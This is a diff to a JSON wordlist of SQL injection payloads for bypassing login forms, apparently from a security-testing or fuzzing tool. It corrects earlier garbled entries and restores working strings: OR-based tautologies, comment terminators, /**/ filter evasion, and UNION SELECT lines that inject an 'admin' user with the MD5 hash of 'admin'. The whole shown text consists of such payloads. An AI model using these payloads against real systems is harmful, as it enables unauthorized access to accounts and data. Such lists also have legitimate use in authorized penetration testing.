@@ -58,9 +58,9 @@
     "admin\") or \"9\"=\"9\" --",
     "admin\") or \"9\"=\"9\"#",
     "admin\") or \"9\"=\"9\"/*",
-    "admin' or true or admin' like '",
-    "admin') or 'admin'' like 'admin'')--",
-    "admin') or 'admin'' like 'admin'')#",
+    "admin' or true or '1' like '",
+    "admin') or '1' like '1')--",
+    "admin') or '1' like '1')#",
     "or/**/9=9",
     "'/**/or/**/9=9",
     "or/**/9=9/**/--",
@@ -117,8 +117,8 @@
     "admin'/**/union/**/select/**/'admin',md5('admin')/**/from/**/users#",
     "admin' union select 'admin','admin' from users#",
     "admin'/**/union/**/select/**/'admin','admin'/**/from/**/users#",
-    "whatever ' AND 9=0 UNION ALL SELECT 'admin', '2admin'232f297a57a5a743894a0e4a80admin'fc3",
-    "whatever ' AND 9=0 UNION ALL SELECT 'admin', '2admin'232f297a57a5a743894a0e4a80admin'fc3",
-    "whatever ' aNd 9=0 uNiOn aLl sElEcT 'admin', '2admin'232f297a57a5a743894a0e4a80admin'fc3"
+    "whatever ' AND 9=0 UNION ALL SELECT 'admin', '21232f297a57a5a743894a0e4a801fc3'#",
+    "whatever ' AND 9=0 UNION ALL SELECT 'admin', '21232f297a57a5a743894a0e4a801fc3'#",
+    "whatever ' aNd 9=0 uNiOn aLl sElEcT 'admin', '21232f297a57a5a743894a0e4a801fc3'#"
   ]
 }
